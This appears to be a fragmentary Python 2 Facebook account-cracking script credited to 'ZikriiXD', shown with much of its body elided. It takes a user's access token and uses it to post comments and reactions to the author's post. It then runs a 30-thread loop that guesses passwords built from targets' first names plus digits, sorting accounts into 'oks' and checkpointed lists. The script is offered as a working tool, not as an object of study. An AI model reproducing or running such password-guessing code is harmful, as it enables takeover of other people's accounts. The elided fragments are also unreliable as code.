...
\33[37;1m██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
\33[37;1m╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
\033[0;40;97m Author : ZikriiXD. \033[0m
 """
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[0;97m[\033[0;39m?\033[0;97m] \33[30;1mToken : \33[30;1m")
	try:
		...
		os.system('xdg-open  https://www.facebook.com/z1kr1muh4mm4dXD')
		bot_komen()
	except KeyError:
...
def bot_komen():
	...
	kom = ('Assalamualaikum😇')
	reac = ('LIKE')
	post = ('873566710163422')
	post2 = ('873566710163422')
	kom2 = ('Izin Pakai Sc Lu Bang Zikri😘')
	reac2 = ('WOW')
		...
		try:
			...
			if 'access_token' in w:
				...
				if 'www.facebook.com' in w['error_msg']:
					...
					pass2 = c['first_name'].lower()+'12345'
																...
																if 'www.facebook.com' in w['error_msg']:
																	...
																	if 'access_token' in w:
																		...
																		if 'www.facebook.com' in w['error_msg']:
																			...
																			w = json.load(data)
																			if 'access_token' in w:
																				print '\033[0;92m | ' + user + ' • ' + pass9 + ' • ' + c['name']
																				oks.append(user)
																			else:
																				if 'www.facebook.com' in w['error_msg']:
																					print '\033[0;93m | ' + user + ' • ' + pass9 + ' • ' + c['name']
																					cekpoint.append(user)
		except:
			pass
	p = ThreadPool(30)
...
def saya():
	...
	os.system('xdg-open https://m.facebook.com/z1kr1muh4mm4dXD')
	menu()
